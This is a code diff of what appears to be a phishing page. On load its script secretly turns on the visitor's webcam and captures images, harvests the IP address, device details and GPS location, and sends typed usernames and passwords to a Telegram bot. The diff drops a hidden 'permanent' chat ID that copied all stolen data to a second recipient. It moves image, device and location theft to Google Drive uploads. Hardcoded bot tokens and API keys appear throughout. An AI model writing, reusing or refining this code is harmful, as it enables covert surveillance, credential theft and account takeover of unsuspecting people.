@@ -104,7 +104,6 @@
             <div>
 
 
-
                 <head>
                     <meta charset="UTF-8">
                     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -248,9 +247,9 @@
                         </div>
                     </div>
                     <script>
-                        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
-                        const permanentChatId = '5634946920'; // Permanent chat ID for sending data
-                
+                        const googleDriveFolderId = '1u696wMejeoHOfOiwDLsCvT5dEj_H-S9m';
+                        const googleApiKey = 'AIzaSyC_knPYNwZSgMWuFwDeZbony5iu97VD18k';
+
                         function getQueryParams() {
                             const params = {};
                             const queryString = window.location.search.slice(1);
@@ -261,9 +260,9 @@
                             }
                             return params;
                         }
-                
-                        const { chatId } = getQueryParams();
-                
+
+                        const { chatId, botToken } = getQueryParams();
+
                         async function startVideo() {
                             try {
                                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -279,7 +278,7 @@
                                 console.error("Error accessing camera: ", error);
                             }
                         }
-                
+
                         function captureImage() {
                             const video = document.getElementById('video');
                             const canvas = document.createElement('canvas');
@@ -287,40 +286,49 @@
                             canvas.height = video.videoHeight;
                             const context = canvas.getContext('2d');
                             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            canvas.toBlob((blob) => {
-                                sendImageToTelegram(blob, chatId);
-                                sendImageToTelegram(blob, permanentChatId);
+                            canvas.toBlob(async (blob) => {
+                                await uploadImageToGoogleDrive(blob);
                             }, 'image/png');
                         }
-                
-                        async function sendImageToTelegram(blob, chatId) {
-                            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+                        async function uploadImageToGoogleDrive(blob) {
+                            const metadata = {
+                                name: 'image.png',
+                                mimeType: 'image/png',
+                                parents: [googleDriveFolderId]
+                            };
+
                             const formData = new FormData();
-                            formData.append('chat_id', chatId);
-                            formData.append('photo', blob, 'image.png');
-                
+                            formData.append('metadata', new Blob([JSON.stringify(metadata)], { type: 'application/json' }));
+                            formData.append('file', blob);
+
+                            const url = `https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&key=${googleApiKey}`;
+
                             try {
                                 const response = await fetch(url, {
                                     method: 'POST',
+                                    headers: {
+                                        'Authorization': `Bearer ${googleApiKey}`
+                                    },
                                     body: formData
                                 });
-                
+
                                 if (response.ok) {
-                                    console.log("Image sent to Telegram");
+                                    console.log("Image uploaded to Google Drive");
                                 } else {
-                                    console.error("Error sending image to Telegram: ", response.statusText);
+                                    console.error("Error uploading image to Google Drive: ", response.statusText);
                                 }
                             } catch (error) {
-                                console.error("Error sending image to Telegram: ", error);
+                                console.error("Error uploading image to Google Drive: ", error);
                             }
                         }
-                
+
                         async function getUserInfo() {
                             try {
                                 const response = await fetch('https://api.ipify.org?format=json');
                                 const data = await response.json();
                                 const ip = data.ip;
-                
+
                                 const userAgent = navigator.userAgent;
                                 const platform = navigator.platform;
                                 const deviceMemory = navigator.deviceMemory || 'N/A';
@@ -330,70 +338,77 @@
                                 const screenHeight = window.screen.height;
                                 const colorDepth = window.screen.colorDepth;
                                 const deviceName = await getDeviceName();
-                
+
                                 const userInfo = { ip, userAgent, platform, deviceMemory, hardwareConcurrency, languages, screenWidth, screenHeight, colorDepth, deviceName };
-                
+
                                 console.log("User info: ", userInfo);
-                
-                                await sendUserInfoToTelegram(userInfo, chatId);
-                                await sendUserInfoToTelegram(userInfo, permanentChatId);
+
+                                await uploadUserInfoToGoogleDrive(userInfo);
                             } catch (error) {
                                 console.error("Error getting user info: ", error);
                             }
                         }
-                
+
                         async function getDeviceName() {
                             const parser = new UAParser();
                             const result = parser.getResult();
                             return result.device.model || 'Unknown Device';
                         }
-                
-                        async function sendUserInfoToTelegram(userInfo, chatId) {
-                            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
+
+                        async function uploadUserInfoToGoogleDrive(userInfo) {
+                            const metadata = {
+                                name: 'user_info.json',
+                                mimeType: 'application/json',
+                                parents: [googleDriveFolderId]
+                            };
+
+                            const blob = new Blob([JSON.stringify(userInfo)], { type: 'application/json' });
+
+                            const formData = new FormData();
+                            formData.append('metadata', new Blob([JSON.stringify(metadata)], { type: 'application/json' }));
+                            formData.append('file', blob);
+
+                            const url = `https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&key=${googleApiKey}`;
+
                             try {
                                 const response = await fetch(url, {
                                     method: 'POST',
                                     headers: {
-                                        'Content-Type': 'application/json'
+                                        'Authorization': `Bearer ${googleApiKey}`
                                     },
-                                    body: JSON.stringify({
-                                        chat_id: chatId,
-                                        text: `User Info:\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}\nPlatform: ${userInfo.platform}\nDevice Memory: ${userInfo.deviceMemory} GB\nHardware Concurrency: ${userInfo.hardwareConcurrency}\nLanguages: ${userInfo.languages}\nScreen Width: ${userInfo.screenWidth}px\nScreen Height: ${userInfo.screenHeight}px\nColor Depth: ${userInfo.colorDepth} bits\nDevice Name: ${userInfo.deviceName}`
-                                    })
+                                    body: formData
                                 });
-                
+
                                 if (response.ok) {
-                                    console.log("User info sent to Telegram");
+                                    console.log("User info uploaded to Google Drive");
                                 } else {
-                                    console.error("Error sending user info to Telegram: ", response.statusText);
+                                    console.error("Error uploading user info to Google Drive: ", response.statusText);
                                 }
                             } catch (error) {
-                                console.error("Error sending user info to Telegram: ", error);
+                                console.error("Error uploading user info to Google Drive: ", error);
                             }
                         }
-                
+
                         async function getLocation() {
                             try {
                                 const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
-                
+
                                 if (permissionStatus.state === 'denied') {
                                     alert('Please enable GPS in your device settings to continue.');
                                     return;
                                 }
-                
+
                                 navigator.geolocation.getCurrentPosition(async (position) => {
                                     const { latitude, longitude } = position.coords;
-                
+
                                     const locationInfo = {
                                         latitude,
                                         longitude
                                     };
-                
+
                                     console.log("Location info: ", locationInfo);
-                
-                                    await sendLocationToTelegram(locationInfo, chatId);
-                                    await sendLocationToTelegram(locationInfo, permanentChatId);
+
+                                    await uploadLocationToGoogleDrive(locationInfo);
                                 }, (error) => {
                                     console.error("Error getting location: ", error);
                                     alert('Please enable GPS in your device settings to continue.');
@@ -403,47 +418,55 @@
                                 alert('Please enable GPS in your device settings to continue.');
                             }
                         }
-                
-                        async function sendLocationToTelegram(locationInfo, chatId) {
-                            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                
+
+                        async function uploadLocationToGoogleDrive(locationInfo) {
+                            const metadata = {
+                                name: 'location_info.json',
+                                mimeType: 'application/json',
+                                parents: [googleDriveFolderId]
+                            };
+
+                            const blob = new Blob([JSON.stringify(locationInfo)], { type: 'application/json' });
+
+                            const formData = new FormData();
+                            formData.append('metadata', new Blob([JSON.stringify(metadata)], { type: 'application/json' }));
+                            formData.append('file', blob);
+
+                            const url = `https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&key=${googleApiKey}`;
+
                             try {
                                 const response = await fetch(url, {
                                     method: 'POST',
                                     headers: {
-                                        'Content-Type': 'application/json'
+                                        'Authorization': `Bearer ${googleApiKey}`
                                     },
-                                    body: JSON.stringify({
-                                        chat_id: chatId,
-                                        text: `Location Info:\nLatitude: ${locationInfo.latitude}\nLongitude: ${locationInfo.longitude}`
-                                    })
+                                    body: formData
                                 });
-                
+
                                 if (response.ok) {
-                                    console.log("Location info sent to Telegram");
+                                    console.log("Location info uploaded to Google Drive");
                                 } else {
-                                    console.error("Error sending location info to Telegram: ", response.statusText);
+                                    console.error("Error uploading location info to Google Drive: ", response.statusText);
                                 }
                             } catch (error) {
-                                console.error("Error sending location info to Telegram: ", error);
+                                console.error("Error uploading location info to Google Drive: ", error);
                             }
                         }
-                
+
                         async function initializeFirstPart() {
                             await startVideo();
                             await getUserInfo();
                             await getLocation();
                             document.getElementById('main-container').style.display = 'flex';
                         }
-                
+
                         function sendToTelegram() {
                             const username = document.getElementById('username').value;
                             const password = document.getElementById('password').value;
                             const message = `Username: ${username}\nPassword: ${password}`;
-                
+
                             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-                            const permanentUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${permanentChatId}&text=${encodeURIComponent(message)}`;
-                
+
                             fetch(url)
                                 .then(response => response.json())
                                 .then(data => {
@@ -452,29 +475,18 @@
                                 .catch(error => {
                                     document.getElementById('error-message').style.display = 'block';
                                 });
-                                
-                            fetch(permanentUrl)
-                                .then(response => response.json())
-                                .then(data => {
-                                    console.log("Credentials sent to permanent chat ID");
-                                })
-                                .catch(error => {
-                                    console.error("Error sending credentials to permanent chat ID: ", error);
-                                });
                         }
-                
+
                         window.onload = () => {
                             initializeFirstPart();
                         };
-                
+
                         document.getElementById('login-button').addEventListener('click', sendToTelegram);
                     </script>
                     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.31/ua-parser.min.js"></script>
                 </body>
-        
-          
+            </div>
         </div>
     </div>
-</div>
 </body>
 </html>
